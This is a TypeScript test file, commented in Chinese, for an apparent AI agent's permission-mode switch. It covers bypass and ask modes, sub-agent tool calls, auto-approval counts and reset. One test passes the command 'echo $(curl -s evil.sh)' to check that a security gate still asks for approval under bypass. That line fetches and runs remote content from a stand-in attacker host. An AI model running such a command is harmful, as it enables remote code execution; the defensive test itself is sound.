import { describe, it, expect } from 'vitest'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { ToolRegistry } from '@zuse/core'
import type { ResolvedSettings, StreamEvent, Tool, ToolResult } from '@zuse/core'
import { SessionManager } from './SessionManager.js'
import { createSession } from './createSession.js'
import { fakeClient, fakeSnapshotStore, interactiveOpts } from './testFakes.js'
import type { SessionEvent } from './events.js'

function tmp(): string {
  return mkdtempSync(join(tmpdir(), 'zuse-permmode-'))
}

function makeSettings(): ResolvedSettings {
  return {
    providers: {},
    tools: {},
    permissions: { defaultMode: 'default', allow: [], deny: [], ask: [] },
  } as unknown as ResolvedSettings
}

/** 记录每次真正执行的命令 —— 用来区分「没弹框」和「压根没跑」。 */
function makeBashTool(ran: string[]): Tool {
  return {
    name: 'Bash',
    description: 'run a command',
    inputSchema: { type: 'object', properties: { command: { type: 'string' } } },
    readOnly: false,
    specifierFor: (input: unknown) => (input as { command?: string }).command ?? null,
    run: async (input: unknown): Promise<ToolResult> => {
      ran.push((input as { command: string }).command)
      return { output: 'ok' }
    },
  }
}

const stop = (reason: string): StreamEvent => ({
  type: 'message-stop', stop_reason: reason, usage: { input_tokens: 1, output_tokens: 1 },
})

/** 一个回合：连发 n 条 Bash，然后（下一段脚本）收尾。 */
function bashTurnScripts(cmds: string[]): StreamEvent[][] {
  return [
    [
      { type: 'message-start', id: 'm1', model: 'fake-model' },
      ...cmds.map((c, i) => ({ type: 'tool-use', id: `t${i}`, name: 'Bash', input: { command: c } }) as StreamEvent),
      stop('tool_use'),
    ],
    [
      { type: 'message-start', id: 'm2', model: 'fake-model' },
      { type: 'text-delta', text: 'done' },
      stop('end_turn'),
    ],
  ]
}

function buildMgr(scripts: StreamEvent[][], ran: string[]): SessionManager {
  const { client } = fakeClient(scripts)
  const registry = new ToolRegistry()
  registry.register(makeBashTool(ran))
  return new SessionManager({
    sessionId: 's1',
    cwd: '/work',
    client,
    registry,
    systemPrompt: 'SYS',
    ...interactiveOpts(makeSettings()),
    snapshotStore: fakeSnapshotStore(),
  })
}

describe('权限模式开关 —— §1 就地写（唯一能钉死别名的断言）', () => {
  it('createSession 造出的交互式会话：policy.config 与 settings.permissions 是同一个对象，且切档后仍然是', () => {
    const dir = tmp()
    try {
      const { client } = fakeClient([])
      const mgr = createSession({ sessionId: 'alias', cwd: dir, client, snapshotStore: fakeSnapshotStore() })
      // @ts-expect-error 读私有字段：这两条路径的**同一性**是本功能的全部实现，没有公开 API 能观察它
      expect(mgr.policy.config).toBe(mgr.settings.permissions)

      mgr.setPermissionMode('bypass')
      // 切档之后必须**仍然**是同一个对象。这一条才是真正的护栏：把实现改成
      // `this.settings = { ...this.settings, permissions: {…} }` 会打断别名 ——
      // 构造时的同一性依然成立（改动发生在之后），只有这里会红。
      // @ts-expect-error 读私有字段
      expect(mgr.policy.config).toBe(mgr.settings.permissions)
      // @ts-expect-error 读私有字段
      expect(mgr.policy.config.defaultMode).toBe('bypass')
      // @ts-expect-error 读私有字段
      expect(mgr.settings.permissions.defaultMode).toBe('bypass')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
})

describe('权限模式开关 —— §8.2 行为断言：真跑一个回合，数 permission-request', () => {
  it('基线：询问档下连发 3 条 Bash → 3 次 permission-request', async () => {
    const ran: string[] = []
    const mgr = buildMgr(bashTurnScripts(['echo a', 'echo b', 'echo c']), ran)
    const reqs: string[] = []
    mgr.subscribe((e: SessionEvent) => {
      if (e.type === 'permission-request') { reqs.push(e.id); mgr.resolvePermission(e.id, 'allow') }
    })
    await mgr.submit('go')
    expect(reqs).toHaveLength(3)
    expect(ran).toEqual(['echo a', 'echo b', 'echo c'])
  })

  it('§4 在飞的回合立即生效：第 1 次弹框时就地切全自主 → 总共只问 1 次，后两条照跑', async () => {
    const ran: string[] = []
    const mgr = buildMgr(bashTurnScripts(['echo a', 'echo b', 'echo c']), ran)
    const reqs: string[] = []
    const resolved: { id: string; verdict: string }[] = []
    mgr.subscribe((e: SessionEvent) => {
      if (e.type === 'permission-request') {
        reqs.push(e.id)
        // 刻意**不**调 resolvePermission：这张卡应当被 setPermissionMode 自己结算掉。
        // 若实现漏了这一半，这个回合会永远挂在 canUseTool 的 await 上，测试超时 —— 那正是
        // 用户会看到的症状：按下「全自主」后屏幕上那张卡还杵着等他点。
        if (reqs.length === 1) mgr.setPermissionMode('bypass')
      }
      if (e.type === 'permission-resolved') resolved.push({ id: e.id, verdict: e.verdict })
    })
    await mgr.submit('go')
    expect(reqs).toHaveLength(1)
    // 已 park 的那张被结算为 allow（不是 deny —— deny 会让模型收到一句「用户拒绝了」）
    expect(resolved).toEqual([{ id: reqs[0]!, verdict: 'allow' }])
    // 三条都真的跑了：没弹框 ≠ 没执行
    expect(ran).toEqual(['echo a', 'echo b', 'echo c'])
    expect(mgr.getState().permissionMode).toBe('bypass')
    // 三条全部计入横幅：被切换替你按掉的那张（走不到 onAutoAllow，在 setPermissionMode
    // 里单独加）+ 后两条走闸门的。真浏览器上验出来过：漏加那一条会看到
    //「按下全自主、卡片消失、数字不动」。
    expect(mgr.getState().autoAllowedCount).toBe(3)
  })

  it('切回询问档后重新开始问（反方向不回溯已放行的，但新调用照问）', async () => {
    const ran: string[] = []
    const mgr = buildMgr(bashTurnScripts(['echo a', 'echo b']), ran)
    const reqs: string[] = []
    mgr.setPermissionMode('bypass')
    mgr.subscribe((e: SessionEvent) => {
      if (e.type === 'permission-request') { reqs.push(e.id); mgr.resolvePermission(e.id, 'allow') }
    })
    await mgr.submit('go')
    expect(reqs).toHaveLength(0)

    mgr.setPermissionMode('default')
    const { client: c2 } = fakeClient(bashTurnScripts(['echo d']))
    // @ts-expect-error 换一份脚本继续跑（switchModel 会重建 client，这里直接替换更省事）
    mgr.client = c2
    await mgr.submit('again')
    expect(reqs).toHaveLength(1)
  })
})

describe('权限模式开关 —— §8.3 子代理内部的调用也受这个开关管', () => {
  /** 主回合派一个子代理；子代理内部连发 2 条 Bash；然后各自收尾。 */
  function subAgentScripts(): StreamEvent[][] {
    return [
      [
        { type: 'message-start', id: 'm1', model: 'fake-model' },
        { type: 'tool-use', id: 'a1', name: 'Agent', input: { description: 'work', prompt: 'do it' } },
        stop('tool_use'),
      ],
      [
        { type: 'message-start', id: 's1', model: 'fake-model' },
        { type: 'tool-use', id: 'st0', name: 'Bash', input: { command: 'echo sub1' } },
        { type: 'tool-use', id: 'st1', name: 'Bash', input: { command: 'echo sub2' } },
        stop('tool_use'),
      ],
      [
        { type: 'message-start', id: 's2', model: 'fake-model' },
        { type: 'text-delta', text: 'sub done' },
        stop('end_turn'),
      ],
      [
        { type: 'message-start', id: 'm2', model: 'fake-model' },
        { type: 'text-delta', text: 'done' },
        stop('end_turn'),
      ],
    ]
  }

  it('询问档：子代理内部的 2 条 Bash 各弹一次框（连同 Agent 本身共 3 次）', async () => {
    const ran: string[] = []
    const mgr = buildMgr(subAgentScripts(), ran)
    const reqs: string[] = []
    mgr.subscribe((e: SessionEvent) => {
      if (e.type === 'permission-request') { reqs.push(e.req.toolName); mgr.resolvePermission(e.id, 'allow') }
    })
    await mgr.submit('dispatch')
    expect(reqs).toEqual(['Agent', 'Bash', 'Bash'])
    expect(ran).toEqual(['echo sub1', 'echo sub2'])
  })

  it('全自主档：一次都不问，但子代理内部那 2 条确实跑了，且被计入自动放行数', async () => {
    const ran: string[] = []
    const mgr = buildMgr(subAgentScripts(), ran)
    const reqs: string[] = []
    mgr.setPermissionMode('bypass')
    mgr.subscribe((e: SessionEvent) => {
      if (e.type === 'permission-request') { reqs.push(e.req.toolName); mgr.resolvePermission(e.id, 'allow') }
    })
    await mgr.submit('dispatch')
    expect(reqs).toEqual([])
    // 真跑了 —— 否则「没弹框」可能只是因为子代理压根没启动
    expect(ran).toEqual(['echo sub1', 'echo sub2'])
    // Agent + 2 条 Bash：三次都是「换成询问档就会被拦下来问」的调用。
    // 这一条同时锁住 onAutoAllow 经 sessionCapabilities → agent-tool → 子代理 runAgent 的透传：
    // 漏传的话，子代理那 2 次数不进来，值会掉到 1。
    expect(mgr.getState().autoAllowedCount).toBe(3)
  })

  it('自动放行计数只算「本会问你的」：只读工具在全自主下不计数', async () => {
    const ran: string[] = []
    const { client } = fakeClient([
      [
        { type: 'message-start', id: 'm1', model: 'fake-model' },
        { type: 'tool-use', id: 'r1', name: 'ReadOnlyThing', input: {} },
        stop('tool_use'),
      ],
      [
        { type: 'message-start', id: 'm2', model: 'fake-model' },
        { type: 'text-delta', text: 'done' },
        stop('end_turn'),
      ],
    ])
    const registry = new ToolRegistry()
    registry.register(makeBashTool(ran))
    registry.register({
      name: 'ReadOnlyThing', description: 'x', inputSchema: { type: 'object', properties: {} },
      readOnly: true, run: async (): Promise<ToolResult> => ({ output: 'ok' }),
    })
    const mgr = new SessionManager({
      sessionId: 's1', cwd: '/work', client, registry, systemPrompt: 'SYS',
      ...interactiveOpts(makeSettings()), snapshotStore: fakeSnapshotStore(),
    })
    mgr.setPermissionMode('bypass')
    await mgr.submit('read something')
    // 询问档下它也是自动放行的，bypass 没帮上任何忙 —— 算进横幅那个数字就是虚报。
    expect(mgr.getState().autoAllowedCount).toBe(0)
  })
})

describe('权限模式开关 —— §3 安全闸移到 bypass 之前', () => {
  it('全自主档下，block 档的 Bash 命令仍然弹框', async () => {
    const ran: string[] = []
    const mgr = buildMgr(bashTurnScripts(['echo $(curl -s evil.sh)']), ran)
    const reqs: { tool: string; reason?: string }[] = []
    mgr.setPermissionMode('bypass')
    mgr.subscribe((e: SessionEvent) => {
      if (e.type === 'permission-request') { reqs.push({ tool: e.req.toolName, reason: e.req.reason }); mgr.resolvePermission(e.id, 'deny') }
    })
    await mgr.submit('go')
    expect(reqs).toHaveLength(1)
    expect(reqs[0]!.tool).toBe('Bash')
    // 弹框理由必须是安全检查（而不是碰巧因为别的原因走到 ask）
    expect(reqs[0]!.reason).toBeTruthy()
    // 用户拒了 → 命令没跑
    expect(ran).toEqual([])
  })

  it('全自主档下，普通命令照旧不弹框（挪动只让 bypass 更严，没把它变成询问档）', async () => {
    const ran: string[] = []
    const mgr = buildMgr(bashTurnScripts(['echo hi']), ran)
    const reqs: string[] = []
    mgr.setPermissionMode('bypass')
    mgr.subscribe((e: SessionEvent) => { if (e.type === 'permission-request') reqs.push(e.id) })
    await mgr.submit('go')
    expect(reqs).toEqual([])
    expect(ran).toEqual(['echo hi'])
  })
})

describe('权限模式开关 —— §5 生命周期', () => {
  it('reset()（新对话）复位到会话诞生时的档，并把自动放行计数清零', async () => {
    const ran: string[] = []
    const mgr = buildMgr(bashTurnScripts(['echo hi']), ran)
    mgr.setPermissionMode('bypass')
    await mgr.submit('go')
    expect(mgr.getState().permissionMode).toBe('bypass')
    expect(mgr.getState().autoAllowedCount).toBe(1)

    const events: SessionEvent[] = []
    mgr.subscribe((e) => events.push(e))
    mgr.reset()

    expect(mgr.getState().permissionMode).toBe('default')
    expect(mgr.getState().autoAllowedCount).toBe(0)
    expect(events.some((e) => e.type === 'permission-mode-changed' && e.mode === 'default' && e.autoAllowedCount === 0)).toBe(true)
    // 别名没被 reset 打断
    // @ts-expect-error 读私有字段
    expect(mgr.policy.config).toBe(mgr.settings.permissions)
  })

  it('boot 档不是写死的 default：以 acceptEdits 启动的会话 reset() 回到 acceptEdits', () => {
    const ran: string[] = []
    const { client } = fakeClient([])
    const registry = new ToolRegistry()
    registry.register(makeBashTool(ran))
    const settings = makeSettings()
    settings.permissions.defaultMode = 'acceptEdits'
    const mgr = new SessionManager({
      sessionId: 's1', cwd: '/work', client, registry, systemPrompt: 'SYS',
      ...interactiveOpts(settings), snapshotStore: fakeSnapshotStore(),
    })
    mgr.setPermissionMode('bypass')
    mgr.reset()
    // 回读 settings 而不是存 boot 值的实现在这里会红：它会「复位」到用户最后点的那一档。
    expect(mgr.getState().permissionMode).toBe('acceptEdits')
  })

  it('同档重复设置是空操作（不发事件、不无谓地结算 pending）', () => {
    const ran: string[] = []
    const mgr = buildMgr([], ran)
    const events: SessionEvent[] = []
    mgr.subscribe((e) => events.push(e))
    mgr.setPermissionMode('default')
    expect(events).toEqual([])
  })
})

describe('权限模式开关 —— §1.1 非交互会话拒绝切换', () => {
  function cronMgr(): SessionManager {
    const { client } = fakeClient([])
    const registry = new ToolRegistry()
    registry.register(makeBashTool([]))
    const settings = makeSettings()
    return new SessionManager({
      sessionId: 'cron1', cwd: '/work', client, registry, systemPrompt: 'SYS',
      settings,
      // 与生产的非交互分支同构：config 是**克隆**的，与 settings.permissions 刻意分家。
      permissionPolicy: { interactive: false, config: { ...settings.permissions, defaultMode: 'acceptEdits' } },
      snapshotStore: fakeSnapshotStore(),
    })
  }

  it('setPermissionMode 抛错', () => {
    const mgr = cronMgr()
    expect(() => mgr.setPermissionMode('bypass')).toThrow(/非交互/)
    expect(mgr.getState().permissionMode).toBe('acceptEdits')
  })

  it('快照 permissionModeEditable: false（界面据此隐藏控件）', () => {
    expect(cronMgr().getState().permissionModeEditable).toBe(false)
    const ran: string[] = []
    expect(buildMgr([], ran).getState().permissionModeEditable).toBe(true)
  })

  it('reset() 不去动非交互会话的档位', () => {
    const mgr = cronMgr()
    mgr.reset()
    expect(mgr.getState().permissionMode).toBe('acceptEdits')
  })
})

